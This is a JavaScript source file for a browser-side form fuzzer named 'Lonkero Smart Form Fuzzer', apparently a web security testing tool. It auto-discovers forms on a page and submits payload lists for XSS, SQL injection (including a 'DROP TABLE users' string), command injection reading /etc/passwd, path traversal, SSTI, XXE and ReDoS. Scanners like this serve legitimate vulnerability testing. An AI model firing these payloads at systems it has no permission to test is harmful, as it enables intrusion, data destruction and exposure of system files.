/**
 * Lonkero Smart Form Fuzzer
 *
 * Auto-discovers and tests forms with context-aware payloads.
 * Detects XSS, SQLi, Command Injection, Path Traversal, SSTI, XXE.
 */

(function() {
  'use strict';

  const PAYLOADS = {
    xss: [
      '<script>alert(1)</script>',
      '"><img src=x onerror=alert(1)>',
      "'-alert(1)-'",
      '{{constructor.constructor("alert(1)")()}}',
      '<svg/onload=alert(1)>',
      'javascript:alert(1)',
      '<img src=x onerror=alert`1`>',
      '"><svg onload=alert(1)>',
      "'-confirm(1)-'",
    ],

    sqli: [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "'; DROP TABLE users; --",
      "1' AND '1'='1",
      "1 OR 1=1",
      "' UNION SELECT NULL--",
      "admin'--",
      "1; SELECT * FROM users",
      "' AND SLEEP(5)--",
    ],

    cmdi: [
      '; ls -la',
      '| cat /etc/passwd',
      '`whoami`',
      '$(id)',
      '; ping -c 3 127.0.0.1',
      '|| dir',
      '& type C:\\Windows\\win.ini',
    ],

    pathTraversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\win.ini',
      '....//....//....//etc/passwd',
      '/etc/passwd%00',
      '..%252f..%252f..%252fetc/passwd',
    ],

    ssti: [
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '#{7*7}',
      '*{7*7}',
      '@(7*7)',
      '{{config}}',
      '{{self.__class__.__mro__}}',
    ],

    xxe: [
      '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost">]>',
    ],

    protoPollution: [
      '__proto__[isAdmin]=true',
      'constructor[prototype][isAdmin]=true',
      '__proto__.isAdmin=true',
    ],

    // ReDoS - Regular Expression Denial of Service
    redos: [
      // Evil regex patterns that cause catastrophic backtracking
      'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!',  // (a+)+ pattern
      'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',   // Email regex
      '0000000000000000000000000000000000000000000000000000000000000e',   // Number parsing
      'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<', // HTML-like
      '                                                               !', // Whitespace trim
      'a]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]',  // Bracket matching
      '(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((',   // Nested parens
      '................................................................', // Dot patterns
      'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\t\n\r',       // Mixed whitespace
      '/////////////////////////////////////////////////',              // Path-like
    ],
  };

  // Field type detection for smart payload selection
  const FIELD_PATTERNS = {
    login: /login|username|user|email|password|pass|pwd/i,
    search: /search|query|q|keyword|find/i,
    email: /email|mail/i,
    number: /id|num|number|amount|qty|quantity|price/i,
    url: /url|link|href|website|site/i,
    file: /file|upload|attachment|document/i,
    comment: /comment|message|content|body|text|description/i,
  };

  class FormFuzzer {
    constructor() {
      this.results = [];
      this.testedForms = new Set();
    }

    // Discover all forms on the page (including SPA virtual forms)
    discoverForms() {
      const formData = [];
      let formIndex = 0;

      // 1. Traditional <form> elements
      const forms = Array.from(document.querySelectorAll('form'));
      for (const form of forms) {
        // Get all visible, testable inputs (exclude hidden, submit, button)
        const inputs = Array.from(form.querySelectorAll('input, textarea, select'))
          .filter(input => {
            const type = (input.type || 'text').toLowerCase();
            // Include text, password, email, search, tel, url, number, textarea, select
            // Exclude hidden, submit, button, reset, image, file (file needs special handling)
            return !['hidden', 'submit', 'button', 'reset', 'image'].includes(type);
          });

        if (inputs.length > 0) {
          formData.push({
            index: formIndex++,
            action: form.action || location.href,
            method: form.method || 'POST',
            inputs: inputs.map(input => ({
              // Try multiple attributes to find a usable name
              name: input.name || input.id ||
                    input.getAttribute('data-name') ||
                    input.getAttribute('data-field') ||
                    input.getAttribute('ng-model') ||
                    input.getAttribute('formcontrolname') ||
                    input.getAttribute('data-testid') ||
                    input.placeholder?.replace(/[^a-zA-Z0-9]/g, '_').toLowerCase() ||
                    `field_${Math.random().toString(36).slice(2, 8)}`,
              type: input.type || 'text',
              placeholder: input.placeholder,
              value: input.value,
              element: input,
            })),
            element: form,
            isVirtual: false,
          });

          console.log(`[FormFuzzer] Form ${formIndex-1}: ${inputs.length} testable inputs`, inputs.map(i => ({
            name: i.name || i.id || '(no name)',
            type: i.type,
            placeholder: i.placeholder
          })));
        }
      }

      // 2. SPA "virtual forms" - look for containers with inputs + button
      // Common patterns: login forms, registration, search, contact forms
      const virtualFormSelectors = [
        '[class*="form"]', '[class*="Form"]',
        '[class*="login"]', '[class*="Login"]',
        '[class*="register"]', '[class*="Register"]',
        '[class*="signup"]', '[class*="SignUp"]',
        '[class*="contact"]', '[class*="Contact"]',
        '[class*="search"]', '[class*="Search"]',
        '[class*="auth"]', '[class*="Auth"]',
        '[data-form]', '[role="form"]',
      ];

      const potentialContainers = document.querySelectorAll(virtualFormSelectors.join(','));
      const processedInputs = new Set();

      for (const container of potentialContainers) {
        // Skip if it's inside an actual form
        if (container.closest('form')) continue;

        const inputs = Array.from(container.querySelectorAll('input:not([type="hidden"]), textarea, select'));
        const buttons = container.querySelectorAll('button, [type="submit"], [class*="submit"], [class*="Submit"]');

        // Need at least 1 input and 1 button-like element
        if (inputs.length > 0 && buttons.length > 0) {
          // Skip if all inputs already processed
          const newInputs = inputs.filter(i => !processedInputs.has(i));
          if (newInputs.length === 0) continue;

          newInputs.forEach(i => processedInputs.add(i));

          formData.push({
            index: formIndex++,
            action: location.href,
            method: 'POST', // Assume POST for virtual forms
            inputs: newInputs.map(input => ({
              name: input.name || input.id || input.getAttribute('data-name') || input.getAttribute('placeholder')?.replace(/\s+/g, '_').toLowerCase() || `field_${Math.random().toString(36).slice(2, 8)}`,
              type: input.type || 'text',
              placeholder: input.placeholder,
              value: input.value,
              element: input,
            })).filter(i => i.name),
            element: container,
            isVirtual: true,
          });
        }
      }

      // 3. Fallback: Find standalone inputs not in any form
      if (formData.length === 0) {
        const allInputs = Array.from(document.querySelectorAll('input:not([type="hidden"]):not([type="submit"]), textarea'));
        const standaloneInputs = allInputs.filter(i => !i.closest('form') && !processedInputs.has(i));

        if (standaloneInputs.length > 0) {
          formData.push({
            index: formIndex++,
            action: location.href,
            method: 'POST',
            inputs: standaloneInputs.map(input => ({
              name: input.name || input.id || input.getAttribute('placeholder')?.replace(/\s+/g, '_').toLowerCase() || `field_${Math.random().toString(36).slice(2, 8)}`,
              type: input.type || 'text',
              placeholder: input.placeholder,
              value: input.value,
              element: input,
            })).filter(i => i.name),
            element: document.body,
            isVirtual: true,
          });
        }
      }

      return formData;
    }

    // Determine field type for smart payload selection
    detectFieldType(input) {
      const name = (input.name || '').toLowerCase();
      const placeholder = (input.placeholder || '').toLowerCase();
      const type = input.type;

      for (const [fieldType, pattern] of Object.entries(FIELD_PATTERNS)) {
        if (pattern.test(name) || pattern.test(placeholder)) {
          return fieldType;
        }
      }

      if (type === 'email') return 'email';
      if (type === 'number') return 'number';
      if (type === 'url') return 'url';
      if (type === 'file') return 'file';

      return 'generic';
    }

    // Select payloads based on field type
    selectPayloads(fieldType) {
      switch (fieldType) {
        case 'login':
          return [...PAYLOADS.sqli, ...PAYLOADS.xss.slice(0, 3)];
        case 'search':
          return [...PAYLOADS.xss, ...PAYLOADS.sqli.slice(0, 3)];
        case 'email':
          return [
            'test@test.com"><script>alert(1)</script>',
            "test@test.com' OR '1'='1",
            'test@test.com{{7*7}}',
          ];
        case 'number':
          return ['1 OR 1=1', '1; SELECT 1', '1+1', '-1'];
        case 'url':
          return [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'file:///etc/passwd',
          ];
        case 'file':
          return ['../../../etc/passwd', '....//....//etc/passwd'];
        case 'comment':
          return [...PAYLOADS.xss, ...PAYLOADS.ssti];
        default:
          return [...PAYLOADS.xss.slice(0, 5), ...PAYLOADS.sqli.slice(0, 3)];
      }
    }

    // Fuzz a single form
    async fuzzForm(formInfo) {
      const results = [];

      console.log(`[FormFuzzer] Fuzzing ${formInfo.inputs.length} inputs in form`);

      for (const input of formInfo.inputs) {
        // Skip only if truly empty name (shouldn't happen with new discovery)
        if (!input.name) {
          console.log('[FormFuzzer] Skipping input with no name');
          continue;
        }

        const fieldType = this.detectFieldType(input);
        const payloads = this.selectPayloads(fieldType);

        console.log(`[FormFuzzer] Testing field "${input.name}" (${fieldType}) with ${payloads.length} payloads`);

        for (const payload of payloads) {
          try {
            const result = await this.testPayload(formInfo, input, payload);
            results.push(result); // Track all results, not just vulnerable ones
            if (result.vulnerable) {
              console.log(`[FormFuzzer] VULNERABLE: ${result.vulnType} in ${input.name}`);
            }
          } catch (e) {
            console.error('[FormFuzzer] Error testing payload:', e);
          }
        }
      }

      return results;
    }

    // Test a single payload
    async testPayload(formInfo, input, payload) {
      const formData = new FormData();

      // Fill form with payload in target field, normal values elsewhere
      for (const field of formInfo.inputs) {
        if (field.name === input.name) {
          formData.append(field.name, payload);
        } else if (field.name && field.type !== 'submit') {
          formData.append(field.name, field.value || 'test');
        }
      }

      const url = formInfo.action;
      const method = formInfo.method.toUpperCase();

      let response;
      try {
        if (method === 'GET') {
          const params = new URLSearchParams(formData);
          response = await fetch(`${url}?${params}`, { method: 'GET' });
        } else {
          response = await fetch(url, { method: method, body: formData });
        }

        const text = await response.text();

        // Check for vulnerability indicators
        const vulnerable = this.checkVulnerability(payload, text, response);

        return {
          url: url,
          method: method,
          field: input.name,
          fieldType: this.detectFieldType(input),
          payload: payload,
          statusCode: response.status,
          vulnerable: vulnerable.isVulnerable,
          vulnType: vulnerable.type,
          evidence: vulnerable.evidence,
        };
      } catch (e) {
        return {
          url: url,
          field: input.name,
          payload: payload,
          error: e.message,
          vulnerable: false,
        };
      }
    }

    // Check if response indicates vulnerability
    checkVulnerability(payload, responseText, response) {
      const result = { isVulnerable: false, type: null, evidence: null };

      // XSS - payload reflected
      if (responseText.includes(payload) ||
          responseText.includes(payload.replace(/</g, '&lt;'))) {
        // Check if it's in a script context or event handler
        if (/<script[^>]*>[\s\S]*alert|on\w+\s*=\s*['"]?[^'"]*alert/i.test(responseText)) {
          result.isVulnerable = true;
          result.type = 'XSS';
          result.evidence = 'Payload reflected in executable context';
        }
      }

      // SQL Error
      const sqlErrors = [
        /sql syntax/i, /mysql_/i, /ORA-\d+/i, /PostgreSQL/i,
        /sqlite/i, /ODBC/i, /syntax error/i, /unclosed quotation/i,
        /microsoft sql/i, /invalid query/i,
      ];
      for (const pattern of sqlErrors) {
        if (pattern.test(responseText)) {
          result.isVulnerable = true;
          result.type = 'SQLi';
          result.evidence = `SQL error detected: ${responseText.match(pattern)?.[0]}`;
          break;
        }
      }

      // SSTI - template evaluated
      if (payload.includes('{{7*7}}') && responseText.includes('49')) {
        result.isVulnerable = true;
        result.type = 'SSTI';
        result.evidence = 'Template expression {{7*7}} evaluated to 49';
      }
      if (payload.includes('${7*7}') && responseText.includes('49')) {
        result.isVulnerable = true;
        result.type = 'SSTI';
        result.evidence = 'Template expression ${7*7} evaluated to 49';
      }

      // Path traversal - check for actual /etc/passwd or win.ini content
      if (/root:[x*]:0:0:|\[boot loader\]|\[operating systems\]/i.test(responseText)) {
        result.isVulnerable = true;
        result.type = 'Path Traversal';
        result.evidence = 'System file contents detected';
      }

      // Command injection
      if (/uid=\d+|gid=\d+|total \d+|drwx/i.test(responseText)) {
        result.isVulnerable = true;
        result.type = 'Command Injection';
        result.evidence = 'Command output detected';
      }

      return result;
    }

    // Discover and fuzz all forms
    async discoverAndFuzzForms() {
      const forms = this.discoverForms();
      console.log(`[FormFuzzer] Found ${forms.length} forms`);

      for (const form of forms) {
        console.log(`[FormFuzzer] Testing form: ${form.action}`);
        const results = await this.fuzzForm(form);
        this.results.push(...results);
      }

      return this.results;
    }

    // Get report
    getReport() {
      const vulnerabilities = this.results.filter(r => r.vulnerable);
      return {
        totalTests: this.results.length,
        vulnerabilities: vulnerabilities.length,
        findings: vulnerabilities.map(v => ({
          type: v.vulnType,
          url: v.url,
          field: v.field,
          payload: v.payload,
          evidence: v.evidence,
        })),
      };
    }
  }

  // Expose to window for console access
  window.formFuzzer = new FormFuzzer();
  console.log('[Lonkero] Form Fuzzer loaded. Use formFuzzer.discoverAndFuzzForms()');

})();
